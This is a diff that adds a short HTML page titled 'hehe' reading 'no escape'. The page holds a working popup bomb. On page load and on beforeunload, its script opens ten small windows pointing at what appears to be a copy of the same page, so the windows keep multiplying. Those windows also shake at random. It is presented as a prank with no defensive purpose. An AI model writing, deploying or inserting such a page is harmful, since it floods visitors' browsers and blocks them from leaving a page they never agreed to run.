@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>hehe</title>
+  </head>
+  <body>
+    <p>no escape</p>
+    <script>
+      const urlParams = new URLSearchParams(window.location.search);
+      const small = urlParams.get('small');
+      function w(){
+        window.open("omay238.github.io/test/index.html?small=true","_blank","width=200,height=200");
+      }
+      function a(){
+        w();
+        w();
+        w();
+        w();
+        w();
+        w();
+        w();
+        w();
+        w();
+        w();
+        if(small){
+          moveBy(Math.random()*20-10, Math.random()*20-10);
+        }
+        return null;
+      }
+      window.onload = window.onbeforeunload = a;
+    </script>
+  </body>
+</html>
